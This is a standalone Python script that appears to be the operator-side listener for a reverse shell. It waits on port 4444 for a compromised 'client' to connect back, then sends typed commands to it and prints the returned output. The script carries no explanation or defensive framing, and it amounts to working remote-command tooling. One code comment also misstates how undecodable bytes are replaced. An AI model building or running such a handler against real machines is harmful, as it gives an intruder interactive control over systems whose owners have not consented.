import socket

# Create the socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = 4444  # Chosen port
lhost = "0.0.0.0"
s.bind((lhost, port))
s.listen(1)
print(f"[~] Listening on {lhost}:{port}")
conn, addr = s.accept()
print(f"[+] Connection accepted {addr}")

while True:
    try:
        # Input the command to send to the client
        cmd = input("> ")
        if not cmd.strip():  # Check if the command is empty
            continue
        
        conn.sendall(cmd.encode())  # Send the command to the client

        # Receiving data from the client
        full_data = b""  # Initialize an empty byte string
        while True:
            data = conn.recv(1024)  # Receive up to 1024 bytes
            if not data or b'END' in data:  # Break if no more data or 'END' is found
                full_data += data.replace(b'END', b'')  # Remove 'END' from the received data
                break
            full_data += data

        if full_data:
            try:
                # Decode the received data in UTF-8, replacing invalid characters with '*'
                decoded_data = full_data.decode('utf-8', errors='replace')
                print(decoded_data)  # Print the client's response
            
            except Exception as e:
                print(f"[!] An error occurred during decoding: {e}")

    except KeyboardInterrupt:
        print("\n[!] Exiting...")
        break
    except Exception as e:
        print(f"[!] An error occurred: {e}")

print("Closing connection")
conn.close()
